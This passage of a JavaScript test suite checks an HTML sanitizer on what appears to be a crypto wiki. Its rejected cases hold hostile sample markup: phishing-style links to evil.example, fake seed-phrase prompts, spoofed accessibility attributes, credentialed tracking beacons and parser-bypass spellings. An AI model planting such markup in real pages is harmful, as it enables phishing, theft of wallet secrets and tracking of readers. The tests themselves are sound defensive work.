rejects('<a href="x"aria-roledescription="Official Notice">go</a>', 'quote-abutted aria-roledescription attribute');
rejects('<p class=x/aria-roledescription="Security Alert">x</p>', 'slash-delimited aria-roledescription attribute');

accepts('<a href="/wiki/aria-roledescription=demo">aria-roledescription docs</a>', 'benign aria-roledescription substring in quoted href');
accepts('ARIA roledescription is an accessibility concept described here only as prose.', 'benign aria-roledescription prose');

// aria-flowto= overrides the default AT reading order — same family as merged
// #559 (aria-controls), #561 (aria-roledescription), #554 (role).
rejects('Intro.\n\n<p aria-flowto="evil-panel">Continue reading here</p>', 'plain aria-flowto attribute');
rejects('Intro.\n\n<a href="https://evil.example/" aria-flowto="phish-block">claim TAO</a>', 'plain aria-flowto attribute on anchor');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-flowto = "evil-panel">stake</a>', 'spaced aria-flowto attribute');
rejects('<a href="x"aria-flowto="evil-panel">go</a>', 'quote-abutted aria-flowto attribute');
rejects('<p class=x/aria-flowto="evil-panel">x</p>', 'slash-delimited aria-flowto attribute');

accepts('<a href="/wiki/aria-flowto=demo">aria-flowto docs</a>', 'benign aria-flowto substring in quoted href');
accepts('ARIA flowto is an accessibility concept described here only as prose.', 'benign aria-flowto prose');

// aria-keyshortcuts= declares fake keyboard shortcuts for AT users — same
// family as merged #564 (aria-flowto), #561 (aria-roledescription), #554 (role).
rejects('Intro.\n\n<p aria-keyshortcuts="Alt+S">Verify wallet</p>', 'plain aria-keyshortcuts attribute');
rejects('Intro.\n\n<a href="https://evil.example/" aria-keyshortcuts="Alt+S">claim TAO</a>', 'plain aria-keyshortcuts attribute on anchor');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-keyshortcuts = "Alt+S">stake</a>', 'spaced aria-keyshortcuts attribute');
rejects('<a href="x"aria-keyshortcuts="Alt+S">go</a>', 'quote-abutted aria-keyshortcuts attribute');
rejects('<p class=x/aria-keyshortcuts="Alt+S">x</p>', 'slash-delimited aria-keyshortcuts attribute');

accepts('<a href="/wiki/aria-keyshortcuts=demo">aria-keyshortcuts docs</a>', 'benign aria-keyshortcuts substring in quoted href');
accepts('ARIA keyshortcuts is an accessibility concept described here only as prose.', 'benign aria-keyshortcuts prose');

// aria-current= marks an element as the "current" item — same family as
// merged #567 (aria-keyshortcuts), #564 (aria-flowto), #561 (aria-roledescription).
rejects('Intro.\n\n<a href="https://evil.example/" aria-current="page">Home</a>', 'plain aria-current attribute on anchor');
rejects('Intro.\n\n<li aria-current="step">Step 1</li>', 'plain aria-current attribute on list item');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-current = "page">stake</a>', 'spaced aria-current attribute');
rejects('<a href="x"aria-current="page">go</a>', 'quote-abutted aria-current attribute');
rejects('<p class=x/aria-current="true">x</p>', 'slash-delimited aria-current attribute');

accepts('<a href="/wiki/aria-current=demo">aria-current docs</a>', 'benign aria-current substring in quoted href');
accepts('ARIA current is an accessibility concept described here only as prose.', 'benign aria-current prose');

// aria-errormessage= associates an element with a custom error message —
// same family as merged #568 (aria-current), #567 (aria-keyshortcuts), #564
// (aria-flowto), #561 (aria-roledescription).
rejects('Intro.\n\n<div aria-errormessage="fake-error" aria-invalid="true">Wallet compromised</div>', 'plain aria-errormessage attribute');
rejects('Intro.\n\n<a href="https://evil.example/" aria-errormessage="fake-alert">claim TAO</a>', 'plain aria-errormessage attribute on anchor');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-errormessage = "fake-error">stake</a>', 'spaced aria-errormessage attribute');
rejects('<a href="x"aria-errormessage="fake-error">go</a>', 'quote-abutted aria-errormessage attribute');
rejects('<p class=x/aria-errormessage="fake-error">x</p>', 'slash-delimited aria-errormessage attribute');

accepts('<a href="/wiki/aria-errormessage=demo">aria-errormessage docs</a>', 'benign aria-errormessage substring in quoted href');
accepts('ARIA errormessage is an accessibility concept described here only as prose.', 'benign aria-errormessage prose');

// aria-owns= reparents elements in the accessibility tree —
// same family as merged #570 (aria-errormessage), #568 (aria-current),
// #567 (aria-keyshortcuts), #564 (aria-flowto), #561 (aria-roledescription).
rejects('Intro.\n\n<div aria-owns="site-nav">Hijacked navigation</div>', 'plain aria-owns attribute');
rejects('Intro.\n\n<a href="https://evil.example/" aria-owns="main-content">claim TAO</a>', 'plain aria-owns attribute on anchor');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-owns = "site-nav">stake</a>', 'spaced aria-owns attribute');
rejects('<a href="x"aria-owns="site-nav">go</a>', 'quote-abutted aria-owns attribute');
rejects('<p class=x/aria-owns="site-nav">x</p>', 'slash-delimited aria-owns attribute');

accepts('<a href="/wiki/aria-owns=demo">aria-owns docs</a>', 'benign aria-owns substring in quoted href');
accepts('ARIA owns is an accessibility concept described here only as prose.', 'benign aria-owns prose');

// HTML microdata attributes (itemscope, itemtype, itemprop, itemref, itemid)
// — content-spoof family like the merged aria-* blocks above.
rejects('Intro.\n\n<div itemscope itemtype="https://schema.org/Product"><span itemprop="name">TAO wallet</span></div>', 'plain itemscope + itemtype + itemprop');
rejects('Intro.\n\n<a href="/wiki/tao/" itemprop="url">tao</a>', 'plain itemprop on anchor');
rejects('Intro.\n\n<div itemscope></div>', 'plain itemscope boolean');
rejects('Intro.\n\n<  div   itemscope   ></div>', 'spaced itemscope boolean');
rejects('Intro.\n\n<img src="/wiki/fig.png" itemprop="image" alt="x">', 'plain itemprop on img');
rejects('Intro.\n\n<div itemref="summary"></div>', 'plain itemref attribute');
rejects('Intro.\n\n<div itemid="urn:isbn:1234"></div>', 'plain itemid attribute');
rejects('Intro.\n\n<div   itemtype = "https://schema.org/Product"></div>', 'spaced itemtype attribute');
rejects('<a href="x"itemprop="name">go</a>', 'quote-abutted itemprop attribute');
rejects('<img src="/wiki/fig.png"/itemtype="https://schema.org/Product">', 'slash-delimited itemtype attribute');
rejects('<div class="x"itemscope></div>', 'quote-abutted itemscope boolean');
rejects('Intro.\n\n<div/itemscope></div>', 'slash-delimited itemscope after tag name');
rejects('Intro.\n\n<div /itemscope></div>', 'slash-delimited itemscope after whitespace');
rejects('<div class="x"/itemscope></div>', 'quote-plus-slash-delimited itemscope boolean');

accepts('Schema.org microdata is a vocabulary described here only as prose.', 'benign schema.org prose');
accepts('<div class=x/itemscope></div>', 'benign slash inside unquoted class value before bare itemscope word');
accepts('itemscope, itemtype, itemprop, itemref, and itemid are HTML5 microdata attributes.', 'benign microdata attribute names in prose');
accepts('<a href="/wiki/itemprop=demo">microdata demo</a>', 'benign itemprop substring in quoted href');
accepts('<span class=x/itemprop-demo>itemprop class example</span>', 'benign itemprop substring in class value');
accepts('<div class="itemscope">plain div</div>', 'benign itemscope as a class value');

// aria-busy= fakes a loading/updating region for assistive technology — same
// family as merged #578 (microdata), #571 (aria-owns), and #568 (aria-current).
// <meter>/<progress> elements are already blocked; aria-busy is the remaining
// status-spoof attribute path for static glossary prose.
rejects('Intro.\n\n<div aria-busy="true">Still syncing wallet data…</div>', 'plain aria-busy attribute');
rejects('Intro.\n\n<a href="https://evil.example/" aria-busy="true">Continue</a>', 'plain aria-busy on anchor');
rejects('Intro.\n\n<  div   aria-busy = "true">x</div>', 'spaced aria-busy attribute');
rejects('<a href="x"aria-busy="true">go</a>', 'quote-abutted aria-busy attribute');
rejects('<p class=x/aria-busy="true">x</p>', 'slash-delimited aria-busy attribute');

accepts('<a href="/wiki/aria-busy=demo">aria-busy docs</a>', 'benign aria-busy substring in quoted href');
accepts('ARIA busy state is an accessibility concept described here only as prose.', 'benign aria-busy prose');

// aria-valuenow/min/max/text= fake range-widget values — same accessibility-state
// spoof family as merged #582 (aria-busy), #587 (aria-disabled/readonly/required),
// and #583 (toggle state); the native meter/progress widgets are element-blocked.
rejects('Intro.\n\n<div aria-valuenow="100">Wallet scan complete</div>', 'plain aria-valuenow attribute');
rejects('Intro.\n\n<div aria-valuetext="100% verified">verified</div>', 'plain aria-valuetext attribute');
rejects('Intro.\n\n<div aria-valuemin="0">x</div>', 'plain aria-valuemin attribute');
rejects('Intro.\n\n<div aria-valuemax="100">x</div>', 'plain aria-valuemax attribute');
rejects('Intro.\n\n<  div   aria-valuenow = "80">x</div>', 'spaced aria-valuenow attribute');
rejects('<a href="x"aria-valuenow="80">go</a>', 'quote-abutted aria-valuenow attribute');
rejects('<div class=x/aria-valuetext="done">x</div>', 'slash-delimited aria-valuetext attribute');
rejects("<p class='x'aria-valuemax='100'>x</p>", 'single-quote-abutted aria-valuemax attribute');

accepts('<a href="/wiki/aria-valuenow=demo">aria-valuenow docs</a>', 'benign aria-valuenow substring in quoted href');
accepts('ARIA valuenow is an accessibility concept described here only as prose.', 'benign aria-valuenow prose');
accepts('<span class=x/aria-valuetext-demo>not an aria-valuetext attribute</span>', 'benign aria-valuetext substring in class value');

// aria-level/posinset/setsize= fake the structure announced to AT — same
// accessibility-state spoof family as merged aria-value, #582 (aria-busy), and
// #583 (toggle state). aria-level forges heading outline; posinset/setsize forge
// list position on allowed native headings and list items.
rejects('Intro.\n\n<h2 aria-level="1">Minor note</h2>', 'plain aria-level attribute on heading');
rejects('Intro.\n\n<li aria-posinset="3">Final step</li>', 'plain aria-posinset attribute');
rejects('Intro.\n\n<li aria-setsize="3">x</li>', 'plain aria-setsize attribute');
rejects('Intro.\n\n<  h3   aria-level = "1">x</h3>', 'spaced aria-level attribute');
rejects('<a href="x"aria-level="1">go</a>', 'quote-abutted aria-level attribute');
rejects('<li class=x/aria-posinset="3">x</li>', 'slash-delimited aria-posinset attribute');
rejects("<li class='x'aria-setsize='3'>x</li>", 'single-quote-abutted aria-setsize attribute');

accepts('<a href="/wiki/aria-level=demo">aria-level docs</a>', 'benign aria-level substring in quoted href');
accepts('ARIA level is an accessibility concept described here only as prose.', 'benign aria-level prose');
accepts('<span class=x/aria-setsize-demo>not an aria-setsize attribute</span>', 'benign aria-setsize substring in class value');

// aria-col*/aria-row*= fake table-grid position/dimensions for AT — the ARIA
// counterpart to the already-blocked native colspan/rowspan (#465), same
// accessibility-structure spoof family as merged aria-level/posinset/setsize.
rejects('Intro.\n\n<table aria-rowcount="500"><tr><td>x</td></tr></table>', 'plain aria-rowcount attribute on table');
rejects('Intro.\n\n<td aria-colspan="9">x</td>', 'plain aria-colspan attribute');
rejects('Intro.\n\n<td aria-colindex="3">x</td>', 'plain aria-colindex attribute');
rejects('Intro.\n\n<td aria-rowindextext="Row three">x</td>', 'plain aria-rowindextext attribute');
rejects('Intro.\n\n<  th   aria-colcount = "9">x</th>', 'spaced aria-colcount attribute');
rejects('<td class="x"aria-rowspan="4">x</td>', 'quote-abutted aria-rowspan attribute');
rejects('<td class=x/aria-rowindex="2">x</td>', 'slash-delimited aria-rowindex attribute');
rejects("<td class='x'aria-colspan='9'>x</td>", 'single-quote-abutted aria-colspan attribute');

accepts('<a href="/wiki/aria-colindex=demo">aria-colindex docs</a>', 'benign aria-colindex substring in quoted href');
accepts('ARIA rowcount is an accessibility concept described here only as prose.', 'benign aria-rowcount prose');
accepts('<span class=x/aria-colspan-demo>not an aria-colspan attribute</span>', 'benign aria-colspan substring in class value');

// aria-orientation/multiselectable= fake composite-widget semantics — same
// accessibility-widget spoof family as merged aria-value, the grid block, and
// #583 (toggle state); read-only prose never exposes composite-widget ARIA.
rejects('Intro.\n\n<ul aria-orientation="horizontal"><li>x</li></ul>', 'plain aria-orientation attribute');
rejects('Intro.\n\n<ul aria-multiselectable="true"><li>x</li></ul>', 'plain aria-multiselectable attribute');
rejects('Intro.\n\n<  ul   aria-orientation = "vertical">x</ul>', 'spaced aria-orientation attribute');
rejects('<div href="x"aria-orientation="horizontal">go</div>', 'quote-abutted aria-orientation attribute');
rejects('<div class=x/aria-multiselectable="true">x</div>', 'slash-delimited aria-multiselectable attribute');
rejects("<ul class='x'aria-orientation='vertical'>x</ul>", 'single-quote-abutted aria-orientation attribute');

accepts('<a href="/wiki/aria-orientation=demo">aria-orientation docs</a>', 'benign aria-orientation substring in quoted href');
accepts('ARIA orientation is an accessibility concept described here only as prose.', 'benign aria-orientation prose');
accepts('<span class=x/aria-multiselectable-demo>not an aria-multiselectable attribute</span>', 'benign aria-multiselectable substring in class value');

// aria-pressed=/aria-checked=/aria-selected= fake toggle and option state —
// same family as merged #582 (aria-busy), #568 (aria-current), and #559
// (aria-expanded).
rejects('Intro.\n\n<a href="https://evil.example/" aria-pressed="true">Continue</a>', 'plain aria-pressed attribute on anchor');
rejects('Intro.\n\n<li aria-selected="true">Step 1</li>', 'plain aria-selected attribute on list item');
rejects('Intro.\n\n<div aria-checked="mixed">50% verified</div>', 'plain aria-checked attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-pressed = "true">stake</a>', 'spaced aria-pressed attribute');
rejects('<a href="x"aria-pressed="true">go</a>', 'quote-abutted aria-pressed attribute');
rejects('<li class=x/aria-selected="true">x</li>', 'slash-delimited aria-selected attribute');
rejects("<p class='x'aria-checked='mixed'>x</p>", 'single-quote-abutted aria-checked attribute');

accepts('<a href="/wiki/aria-pressed=demo">aria-pressed docs</a>', 'benign aria-pressed substring in quoted href');
accepts('ARIA pressed state is an accessibility concept described here only as prose.', 'benign aria-pressed prose');
accepts('<span class=x/aria-selected-demo>not an aria-selected attribute</span>', 'benign aria-selected substring in class value');

// aria-disabled=/aria-readonly=/aria-required= fake form-widget state —
// same family as merged #583 (toggle state), #570 (aria-errormessage), and inert.
rejects('Intro.\n\n<a href="https://evil.example/" aria-disabled="true">Verify wallet</a>', 'plain aria-disabled attribute on anchor');
rejects('Intro.\n\n<div aria-required="true">Enter seed phrase</div>', 'plain aria-required attribute');
rejects('Intro.\n\n<div aria-readonly="true">Paste seed phrase here</div>', 'plain aria-readonly attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-disabled = "true">stake</a>', 'spaced aria-disabled attribute');
rejects('<a href="x"aria-disabled="true">go</a>', 'quote-abutted aria-disabled attribute');
rejects('<div class=x/aria-required="true">x</div>', 'slash-delimited aria-required attribute');
rejects("<p class='x'aria-readonly='true'>x</p>", 'single-quote-abutted aria-readonly attribute');

accepts('<a href="/wiki/aria-disabled=demo">aria-disabled docs</a>', 'benign aria-disabled substring in quoted href');
accepts('ARIA disabled state is an accessibility concept described here only as prose.', 'benign aria-disabled prose');
accepts('<span class=x/aria-required-demo>not an aria-required attribute</span>', 'benign aria-required substring in class value');

// aria-haspopup=/aria-modal= fake popup and modal-dialog state — same family
// as merged #587 (aria-disabled/readonly/required), #583 (toggle state), and
// #582 (aria-busy).
rejects('Intro.\n\n<a href="https://evil.example/" aria-haspopup="menu">Verify wallet</a>', 'plain aria-haspopup attribute on anchor');
rejects('Intro.\n\n<div aria-modal="true">Enter seed phrase</div>', 'plain aria-modal attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-haspopup = "true">stake</a>', 'spaced aria-haspopup attribute');
rejects('<a href="x"aria-haspopup="true">go</a>', 'quote-abutted aria-haspopup attribute');
rejects('<div class=x/aria-modal="true">x</div>', 'slash-delimited aria-modal attribute');
rejects("<p class='x'aria-modal='true'>x</p>", 'single-quote-abutted aria-modal attribute');

accepts('<a href="/wiki/aria-haspopup=demo">aria-haspopup docs</a>', 'benign aria-haspopup substring in quoted href');
accepts('ARIA haspopup state is an accessibility concept described here only as prose.', 'benign aria-haspopup prose');
accepts('<span class=x/aria-modal-demo>not an aria-modal attribute</span>', 'benign aria-modal substring in class value');

// aria-invalid= fakes a validation-error state — same form-widget state-spoof
// family as merged #587 (aria-disabled/readonly/required), #583 (toggle state),
// and #570 (aria-errormessage). It is the remaining form-validation ARIA path.
rejects('Intro.\n\n<a href="https://evil.example/" aria-invalid="true">Verify wallet</a>', 'plain aria-invalid attribute on anchor');
rejects('Intro.\n\n<div aria-invalid="spelling">Paste seed phrase here</div>', 'plain aria-invalid attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   aria-invalid = "true">stake</a>', 'spaced aria-invalid attribute');
rejects('<a href="x"aria-invalid="true">go</a>', 'quote-abutted aria-invalid attribute');
rejects('<div class=x/aria-invalid="true">x</div>', 'slash-delimited aria-invalid attribute');
rejects("<p class='x'aria-invalid='grammar'>x</p>", 'single-quote-abutted aria-invalid attribute');

accepts('<a href="/wiki/aria-invalid=demo">aria-invalid docs</a>', 'benign aria-invalid substring in quoted href');
accepts('ARIA invalid state is an accessibility concept described here only as prose.', 'benign aria-invalid prose');
accepts('<span class=x/aria-invalid-demo>not an aria-invalid attribute</span>', 'benign aria-invalid substring in class value');

// aria-description/aria-details= override the accessible description with attacker
// text — same accessibility-name/description spoof family as merged #553
// (aria-describedby), #501 (aria-label), and #561 (aria-roledescription).
rejects('Intro.\n\n<a href="https://evil.example/" aria-description="Verified by Bittensor Foundation">Continue</a>', 'plain aria-description attribute on anchor');
rejects('Intro.\n\n<div aria-details="evil-note">Paste seed phrase here</div>', 'plain aria-details attribute');
rejects('Intro.\n\n<  div   aria-description = "trusted">x</div>', 'spaced aria-description attribute');
rejects('<a href="x"aria-description="trusted">go</a>', 'quote-abutted aria-description attribute');
rejects('<div class=x/aria-details="note">x</div>', 'slash-delimited aria-details attribute');
rejects("<p class='x'aria-description='trusted'>x</p>", 'single-quote-abutted aria-description attribute');

accepts('<a href="/wiki/aria-description=demo">aria-description docs</a>', 'benign aria-description substring in quoted href');
accepts('ARIA description is an accessibility concept described here only as prose.', 'benign aria-description prose');
accepts('<span class=x/aria-details-demo>not an aria-details attribute</span>', 'benign aria-details substring in class value');

// aria-braillelabel/aria-brailleroledescription= override the braille-display
// accessible name/role — the braille channel twins of the merged #501
// (aria-label) and #561 (aria-roledescription) name/role spoofs.
rejects('Intro.\n\n<a href="https://evil.example/" aria-braillelabel="Official Bittensor wallet">Continue</a>', 'plain aria-braillelabel attribute on anchor');
rejects('Intro.\n\n<div aria-brailleroledescription="Security Alert">x</div>', 'plain aria-brailleroledescription attribute');
rejects('Intro.\n\n<  div   aria-braillelabel = "trusted">x</div>', 'spaced aria-braillelabel attribute');
rejects('<a href="x"aria-braillelabel="trusted">go</a>', 'quote-abutted aria-braillelabel attribute');
rejects('<div class=x/aria-brailleroledescription="Alert">x</div>', 'slash-delimited aria-brailleroledescription attribute');
rejects("<p class='x'aria-braillelabel='trusted'>x</p>", 'single-quote-abutted aria-braillelabel attribute');

accepts('<a href="/wiki/aria-braillelabel=demo">aria-braillelabel docs</a>', 'benign aria-braillelabel substring in quoted href');
accepts('ARIA braillelabel is an accessibility concept described here only as prose.', 'benign aria-braillelabel prose');
accepts('<span class=x/aria-braillelabel-demo>not an aria-braillelabel attribute</span>', 'benign aria-braillelabel substring in class value');

// aria-placeholder/multiline/autocomplete= fake editable text-field semantics —
// the form-widget config counterpart to the merged #587 form-widget state block
// (aria-disabled/readonly/required); read-only prose never exposes input ARIA.
rejects('Intro.\n\n<div aria-placeholder="Paste your seed phrase">x</div>', 'plain aria-placeholder attribute');
rejects('Intro.\n\n<div aria-multiline="true">x</div>', 'plain aria-multiline attribute');
rejects('Intro.\n\n<div aria-autocomplete="list">x</div>', 'plain aria-autocomplete attribute');
rejects('Intro.\n\n<  div   aria-placeholder = "seed">x</div>', 'spaced aria-placeholder attribute');
rejects('<a href="x"aria-placeholder="seed">go</a>', 'quote-abutted aria-placeholder attribute');
rejects('<div class=x/aria-multiline="true">x</div>', 'slash-delimited aria-multiline attribute');
rejects("<p class='x'aria-autocomplete='list'>x</p>", 'single-quote-abutted aria-autocomplete attribute');

accepts('<a href="/wiki/aria-placeholder=demo">aria-placeholder docs</a>', 'benign aria-placeholder substring in quoted href');
accepts('ARIA placeholder is an accessibility concept described here only as prose.', 'benign aria-placeholder prose');
accepts('<span class=x/aria-multiline-demo>not an aria-multiline attribute</span>', 'benign aria-multiline substring in class value');

// aria-activedescendant= fakes the virtually-focused child of a composite widget
// — same composite-widget spoof family as merged aria-orientation/multiselectable,
// the grid block, and #583 (toggle state); static prose never manages ARIA focus.
rejects('Intro.\n\n<ul aria-activedescendant="evil-link"><li id="evil-link">x</li></ul>', 'plain aria-activedescendant attribute');
rejects('Intro.\n\n<  div   aria-activedescendant = "node-2">x</div>', 'spaced aria-activedescendant attribute');
rejects('<div href="x"aria-activedescendant="node-2">go</div>', 'quote-abutted aria-activedescendant attribute');
rejects('<div class=x/aria-activedescendant="node-2">x</div>', 'slash-delimited aria-activedescendant attribute');
rejects("<ul class='x'aria-activedescendant='node-2'>x</ul>", 'single-quote-abutted aria-activedescendant attribute');

accepts('<a href="/wiki/aria-activedescendant=demo">aria-activedescendant docs</a>', 'benign aria-activedescendant substring in quoted href');
accepts('ARIA activedescendant is an accessibility concept described here only as prose.', 'benign aria-activedescendant prose');
accepts('<span class=x/aria-activedescendant-demo>not an aria-activedescendant attribute</span>', 'benign aria-activedescendant substring in class value');

// aria-relevant= is the third live-region control attribute alongside the merged
// aria-live/aria-atomic block (#558); it shapes which mutations a live region
// announces. A static glossary has no live regions, so complete the set.
rejects('Intro.\n\n<div aria-relevant="all">x</div>', 'plain aria-relevant attribute');
rejects('Intro.\n\n<div aria-relevant="additions text">x</div>', 'plain aria-relevant multi-token value');
rejects('Intro.\n\n<  div   aria-relevant = "removals">x</div>', 'spaced aria-relevant attribute');
rejects('<a href="x"aria-relevant="all">go</a>', 'quote-abutted aria-relevant attribute');
rejects('<div class=x/aria-relevant="all">x</div>', 'slash-delimited aria-relevant attribute');
rejects("<p class='x'aria-relevant='text'>x</p>", 'single-quote-abutted aria-relevant attribute');

accepts('<a href="/wiki/aria-relevant=demo">aria-relevant docs</a>', 'benign aria-relevant substring in quoted href');
accepts('ARIA relevant is an accessibility concept described here only as prose.', 'benign aria-relevant prose');
accepts('<span class=x/aria-relevant-demo>not an aria-relevant attribute</span>', 'benign aria-relevant substring in class value');

// srcset=/sizes= on <img> steer responsive loading — gap after #411 blocked picture/source.
rejects('Intro.\n\n<img src="/wiki/fig.png" srcset="https://evil.example/x 1x" alt="x">', 'plain img srcset attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   srcset = "https://evil.example/x 2x">', 'spaced img srcset attribute');
rejects('<img src="/wiki/fig.png"srcset="https://evil.example/x 1x">', 'quote-abutted img srcset attribute');
rejects('Intro.\n\n<img src="/wiki/fig.png" sizes="100vw" srcset="/a 100w" alt="x">', 'plain img sizes attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   sizes = "50vw">', 'spaced img sizes attribute');
rejects('<img src="/wiki/fig.png"sizes="100vw">', 'quote-abutted img sizes attribute');
accepts('<img src=/wiki/srcset-demo.png alt=diagram>', 'benign unquoted img src path containing srcset substring');
accepts('<img src=/wiki/sizes-demo.png alt=diagram>', 'benign unquoted img src path containing sizes substring');
accepts('Responsive srcset and media sizes are described here only as prose.', 'benign srcset/sizes prose');

// loading= on <img> defers fetch until near viewport — scroll-triggered beacon (merged #461 family).
rejects('Intro.\n\n<img src="https://evil.example/pixel.gif" loading="lazy" alt="x">', 'plain img loading attribute');

// start= on <ol> and value= on <li> renumber ordered-list items — content-spoof
// primitive (injected "Step 99" before legitimate "Step 1"). The wiki uses
// ordered lists heavily (308+ articles); a malicious start value rewrites
// the reader's mental model of which step they're on. Same content-spoof
// class as the merged frame/rules/summary table block (#471).
rejects('Intro.\n\n<ol start="99"><li>Step 99</li></ol>', 'plain ol start attribute');
rejects('Intro.\n\n<ol   start = "5">x</ol>', 'spaced ol start attribute');
rejects('<ol class="x"start="99">x</ol>', 'quote-abutted ol start attribute');
rejects('<ol class=x/start="99">', 'slash-delimited ol start attribute');
rejects('Intro.\n\n<ol><li value="5">x</li></ol>', 'plain li value attribute');
rejects('Intro.\n\n<ol><li   value = "10">x</li></ol>', 'spaced li value attribute');
rejects('<ol><li class="x"value="5">x</li></ol>', 'quote-abutted li value attribute');
rejects('<ol><li class=x/value="5">x</li></ol>', 'slash-delimited li value attribute');
rejects('Intro.\n\n<ol type="A"><li>Fake step A</li></ol>', 'plain ol type attribute');
rejects('Intro.\n\n<ul   type = "square"><li>callout</li></ul>', 'spaced ul type attribute');
rejects('Intro.\n\n<ol><li type="I">Fake step I</li></ol>', 'plain li type attribute');
rejects('<ol class="x"type="A">x</ol>', 'quote-abutted ol type attribute');
rejects('<ul class=x/type="square">', 'slash-delimited ul type attribute');
rejects('Intro.\n\n<ol reversed><li>Step 1</li><li>Step 2</li></ol>', 'plain ol reversed attribute');
rejects('Intro.\n\n<ol   reversed   ><li>x</li></ol>', 'spaced ol reversed attribute');
rejects('Intro.\n\n<ol reversed="reversed"><li>x</li></ol>', 'valued ol reversed attribute');
rejects('<ol class="x"reversed><li>x</li></ol>', 'quote-abutted ol reversed attribute');
rejects('Intro.\n\n<ol/reversed><li>x</li></ol>', 'slash-delimited ol reversed after tag name');
rejects('Intro.\n\n<ol /reversed><li>x</li></ol>', 'slash-delimited ol reversed after whitespace');
rejects('<ol class="x"/reversed><li>x</li></ol>', 'quote-plus-slash-delimited ol reversed attribute');

accepts('<ol><li>plain item</li></ol>', 'plain ordered list without start/value');
accepts('<ul class="topics"><li>plain item</li></ul>', 'plain unordered list without type');
accepts('Step 1: setup; Step 2: build. The numbering must remain default.', 'benign step numbering prose');
accepts('A list marker type can be described in prose without setting an attribute.', 'benign list type prose');
accepts('<ol class=x/reversed><li>x</li></ol>', 'benign slash inside unquoted class value before bare reversed word');
accepts('A reversed list can be described in prose without setting an attribute.', 'benign reversed prose');
accepts('<ol class=x/reversed-list><li>not a reversed attribute</li></ol>', 'benign slash inside class value before reversed');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   loading = "lazy">', 'spaced img loading attribute');
rejects('<img src="/wiki/fig.png"loading="lazy">', 'quote-abutted img loading attribute');
accepts('<img src=/wiki/loading-demo.png alt=diagram>', 'benign unquoted img src path containing loading substring');
accepts('Lazy loading improves performance and is described here only as prose.', 'benign loading prose');

// fetchpriority= on <img> bumps attacker URL fetch ahead of page assets — same family as loading #462.
rejects('Intro.\n\n<img src="https://evil.example/pixel.gif" fetchpriority="high" alt="x">', 'plain img fetchpriority attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   fetchpriority = "high">', 'spaced img fetchpriority attribute');
rejects('<img src="/wiki/fig.png"fetchpriority="high">', 'quote-abutted img fetchpriority attribute');
accepts('<img src=/wiki/fetchpriority-demo.png alt=diagram>', 'benign unquoted img src path containing fetchpriority substring');
accepts('Fetch priority hints improve performance and are described here only as prose.', 'benign fetchpriority prose');

// decoding= on <img> forces synchronous decode of an attacker URL (main-thread
// stall / reading DoS) — same img-scoped rendering-control family as loading #462
// and fetchpriority. Markdown never emits decoding=.
rejects('Intro.\n\n<img src="https://evil.example/huge.png" decoding="sync" alt="x">', 'plain img decoding attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   decoding = "sync">', 'spaced img decoding attribute');
rejects('<img src="/wiki/fig.png"decoding="sync">', 'quote-abutted img decoding attribute');
accepts('<img src=/wiki/decoding-demo.png alt=diagram>', 'benign unquoted img src path containing decoding substring');
accepts('Image decoding strategies are described here only as prose.', 'benign decoding prose');

// crossorigin= on <img> forces a credentialed/anonymous CORS fetch of an attacker
// URL — <img crossorigin="use-credentials" src> sends the reader's cookies
// cross-origin, a credentialed tracking beacon distinct from a plain <img src>.
// Same img-scoped fetch/privacy family as loading #462 / fetchpriority / decoding.
// Markdown never emits crossorigin=. Includes the slash-delimited parse bypass.
rejects('Intro.\n\n<img src="https://evil.example/pixel.gif" crossorigin="use-credentials" alt="x">', 'plain img crossorigin attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   crossorigin = "anonymous">', 'spaced img crossorigin attribute');
rejects('<img src="/wiki/fig.png"crossorigin="anonymous">', 'quote-abutted img crossorigin attribute');
rejects('<img src="/wiki/fig.png"/crossorigin="anonymous">', 'quote-plus-slash-delimited img crossorigin attribute');
rejects('Intro.\n\n<img/crossorigin="anonymous" src="/wiki/fig.png" alt="x">', 'slash-delimited img crossorigin after tag name');
rejects('Intro.\n\n<img src="/wiki/fig.png" /crossorigin="anonymous">', 'whitespace-slash-delimited img crossorigin attribute');
accepts('<img src=/wiki/crossorigin-demo.png alt=diagram>', 'benign unquoted img src path containing crossorigin substring');
accepts('The crossorigin attribute is described here only as prose.', 'benign crossorigin prose');

// attributionsrc on <a> or <img> opts the element into the Attribution Reporting
// API, causing extra browser reporting requests on click/view without script.
rejects('Intro.\n\n<a href="https://evil.example/" attributionsrc="https://evil.example/register-source">go</a>', 'plain anchor attributionsrc attribute');
rejects('Intro.\n\n<  a   href="/wiki/foo/"   attributionsrc = "https://evil.example/register-source">go</a>', 'spaced anchor attributionsrc attribute');
rejects('<a href="/wiki/foo/"attributionsrc="https://evil.example/register-source">go</a>', 'quote-abutted anchor attributionsrc attribute');
rejects('Intro.\n\n<a href="https://evil.example/" attributionsrc>go</a>', 'bare anchor attributionsrc attribute');
rejects('Intro.\n\n<a/attributionsrc href="https://evil.example/">go</a>', 'slash-delimited bare anchor attributionsrc after tag name');
rejects('Intro.\n\n<a /attributionsrc href="https://evil.example/">go</a>', 'slash-delimited bare anchor attributionsrc after whitespace');
rejects('<a class="x"/attributionsrc href="/wiki/foo/">go</a>', 'quote-plus-slash-delimited bare anchor attributionsrc attribute');
rejects('Intro.\n\n<img src="https://evil.example/pixel.gif" attributionsrc="https://evil.example/register-source" alt="x">', 'plain img attributionsrc attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   attributionsrc = "https://evil.example/register-source">', 'spaced img attributionsrc attribute');
rejects('<img src="/wiki/fig.png"attributionsrc="https://evil.example/register-source">', 'quote-abutted img attributionsrc attribute');
rejects('Intro.\n\n<img src="/wiki/fig.png" attributionsrc alt="x">', 'bare img attributionsrc attribute');
